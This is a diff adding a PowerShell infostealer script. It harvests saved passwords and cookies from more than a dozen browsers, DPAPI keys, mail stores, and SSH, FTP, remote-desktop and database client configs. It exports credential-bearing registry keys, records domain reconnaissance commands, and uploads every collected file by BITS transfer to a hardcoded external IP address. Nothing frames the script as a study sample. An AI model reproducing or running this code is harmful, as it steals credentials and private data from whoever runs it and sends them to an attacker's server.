@@ -1,0 +1,70 @@
+$host1 = hostname
+$time1 = (([DateTime]::Now.ToUniversalTime().Ticks - 621355968000000000)/10000).tostring().Substring(0,13)
+$ip = (curl ifconfig.me|Select-Object -Expandproperty Content)
+$test1=((dir env:appdata |Select-Object -Expandproperty value) + "\Mozilla\Firefox\Profiles\" |  Get-ChildItem -Recurse -Include *logins.json,*.db,*signons.sqlite,*cookies.sqlite,*places.sqlite |Select-Object FullName).FullName
+$test2=((dir env:appdata |Select-Object -Expandproperty value) + "\..\Roaming\Microsoft\Protect" | Get-ChildItem -Recurse -Include * -Hidden | Select-Object FullName).FullName
+$test3=((dir env:appdata |Select-Object -Expandproperty value) + "\Opera Software\Opera Stable" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+$test4=((dir env:appdata |Select-Object -Expandproperty value) + "\Opera Software\Opera Stable" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+$test5=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Yandex\andexbrowser\" | Get-ChildItem -Recurse -Include "Ya Passman Data"| Select-Object FullName).FullName
+$test6=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Vivaldi\User Data\Default\" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+$test7=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\CentBrowser\User Data\Default\" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+$test8=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Comodo\Dragon\User Data\Default\" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+$test9=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Chedot\User Data\Default\" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+$test10=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Orbitum\User Data\Default\" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+$test11=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Chromium\User Data\Default\" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+$test12=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Slimjet\User Data\Default\" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+$test13=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Xvast\User Data\Default\" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+$test14=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Kinza\User Data\Default\" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+$test15=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Iridium\User Data\Default\" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+$test16=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\CocCoc\Browser\User Data\Default\" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+$test17=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\AVAST Software\Browser\User Data\Default\" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+$test18=((dir env:LOCALAPPDATA |Select-Object -Expandproperty value) + "\Google\Chrome\User Data\Default\Login Data" | Get-ChildItem -Recurse -Include * -Hidden | Select-Object FullName).FullNam
+$test19=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\\Microsoft\Outlook\" | Get-ChildItem -Recurse -Include *.pst| Select-Object FullName).FullName
+$test20=((dir env:appdata |Select-Object -Expandproperty value) + "\Thunderbird\Profiles\" |  Get-ChildItem -Recurse -Include *logins.json,*.db |Select-Object FullName).FullName
+$test21=(((dir env:appdata |Select-Object -Expandproperty value) + "\..\..\Documents\NetSarang Computer\") | Get-ChildItem   -Recurse -Include *.xsh).fullname
+$test22=(((dir env:appdata |Select-Object -Expandproperty value) + "\..\..\Documents\NetSarang\") | Get-ChildItem   -Recurse -Include *.xsh).fullname
+$test25=(((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Microsoft\Windows Live\") | Get-ChildItem   -Recurse -Include Contacts).fullname
+$test26=(((dir env:userprofile |Select-Object -Expandproperty value) + "\AppData\Roaming\FileZilla\") | Get-ChildItem).fullname
+$test27=(((reg query "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\ToDesk" /v DisplayIcon).split("REG_SZ"))[15].Replace("ToDesk.exe","").Replace('    ',"") |  Get-ChildItem -Recurse -Include  *.ini).fullname
+$test28=(((dir env:appdata |Select-Object -Expandproperty value) + "\MobaXterm\") | Get-ChildItem   -Recurse -Include *.ini).fullname
+$test31=(((dir env:appdata |Select-Object -Expandproperty value) + "\..\..\Documents\WeChat Files") | Get-ChildItem -Recurse -Include AccInfo.dat,config.data).fullname
+$test32=(((reg query "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Oray SunLogin RemoteClient" /v DisplayIcon).split("REG_SZ"))[17].Replace("uninstall.exe","").Replace('    ',"") | Get-ChildItem  -Recurse -Include  config.ini).fullname
+$test33=(Get-ChildItem C:\ProgramData\Oray-Recurse-Include config.ini).fullname
+$test34=(((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Netease\MailMaster\data\") | Get-ChildItem -Recurse -Include *.db).fullname
+$test35=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Temp\") + $time1 + "." + "rdp13q.reg"
+reg export "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" ($test35)
+$test36=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Temp\") + $time1 + "." + "start_ftp123.reg"
+reg export "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\MSFtpsvc\Parameters\Virtual Roots\ControlSet002" ($test36)
+$test37=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Temp\") + $time1 + "." + "serv_u123.reg"
+reg export "HKEY_LOCAL_MACHINE\SOFTWARE\Cat Soft\Serv-U\Domains\1\UserList" ($test37)
+$test38=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Temp\") + $time1 + "." + "Parameters123.reg"
+reg export "HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\" ($test38)
+$test39=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Temp\") + $time1 + "." + "iis123.reg"
+reg export "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\MSFtpsvc\Parameters\Virtual Roots" ($test39)
+$test40=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Temp\") + $time1 + "." + "putty.reg"
+reg export "HKEY_CURRENT_USER\SOFTWARE\SimonTatham" ($test40)
+$test41=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Temp\") + $time1 + "." + "ms_office.reg"
+reg export "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0" ($test41)
+$test42=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Temp\") + $time1 + "." + "winscp.reg"
+reg export "HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2" ($test42)
+$test43=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Temp\") + $time1 + "." + "navicat.reg"
+reg export "HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers" ($test43)
+$test45="C:\Program Files\Oray\SunLogin\SunloginClient\config.ini"
+$test46="C:\ProgramData\Oray\SunloginClient\config.ini"
+$test47="C:\ZKEYS\Setup.ini"
+$test48="c:\windows\system32\inetsrv\MetaBase.xml"
+$test49=((dir env:appdata |Select-Object -Expandproperty value) + "\Microsoft\Microsoft SQL Server\" |  Get-ChildItem -Recurse -Include  SqlStudio.bin,mru.dat |Select-Object FullName).FullName
+$test50=((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\Temp\") + $time1 + "." + "command_line123.reg"
+$config4=systeminfo
+$config3=ipconfig /all
+$config1 = net config workstation
+$config2 = net time /domain
+$config5 = net group /domain
+$config6 = net accounts /domain
+$config7 = wmic useraccount get /all
+$config8 = net localgroup administrators
+$config9 = wmic product get name,version
+echo "net config workstation" $config1  "net time /domain" $config2  "ipconfig /all" $config3 "systeminfo" $config4 "net group /domain" $config5 "net accounts /domain"  $config6  "wmic useraccount get /all" $config7 "net localgroup administrators"  $config8 "wmic product get name,version" config9 >> $test50
+$path= $test1+$test2+$test3+$test4+$test5+$test6+$test7+$test8+$test9+$test10+$test11+$test12+$test13+$test14+$test15+$test16+$test17+$test18+$test19+$test20+$test21+$test22+$test23+$test24+$test25+$test26+$test27+$test28+$test29+$test30+$test31+$test32+$test33+$test34+$test35+$test36+$test37+$test38+$test39+$test40+$test41+$test42+$test43+$test44+$test45+$test46+$test47+$test48+$test49+$test50
+foreach($a in $path){ $http_url = "http://149.28.47.253:443/" +  $ip + "." + $host1 + "." + $time1 + "." + $a.Replace("\","-").replace(":","")
+Start-BitsTransfer -Source $a -Destination $http_url -TransferType Upload}
